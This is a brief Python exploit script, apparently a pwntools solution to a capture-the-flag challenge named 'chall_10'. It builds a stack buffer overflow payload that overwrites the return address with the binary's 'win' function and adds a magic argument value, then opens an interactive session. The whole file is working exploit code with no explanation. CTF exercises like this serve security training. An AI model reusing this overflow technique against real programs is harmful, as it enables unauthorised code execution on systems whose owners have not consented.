# coding: utf-8
def chall10():
    p = process("./chall_10")
    elf = ELF("./chall_10")
    p.recv()
    payload = (b"a"*0x308 + b"a"*4 + p32(elf.sym.win) + b"a"*4 + p32(0x1a55fac3))
    p.sendline(payload)    
    p.interactive()
    
chall10()
